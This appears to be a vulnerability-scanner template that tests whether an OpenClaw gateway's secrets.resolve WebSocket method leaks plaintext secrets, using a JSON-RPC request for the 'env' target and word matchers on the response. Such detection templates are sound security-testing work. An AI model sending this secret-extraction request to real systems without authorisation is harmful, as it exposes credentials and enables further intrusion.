id: openclaw-secrets-resolve

info:
  name: OpenClaw secrets.resolve Plaintext Extraction
  author: lobster-guard
  severity: critical
  description: Tests if secrets.resolve WS method returns plaintext secret values — the internal API used to inject secrets into tool environments
  tags: openclaw,secrets,extraction,critical

websocket:
  - address: "{{Host}}/gateway"
    inputs:
      - data: '{"jsonrpc":"2.0","id":1,"method":"secrets.resolve","params":{"commandName":"system.run","targetIds":["env"]}}'
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "assignments"
          - "value"
          - "path"
        condition: and
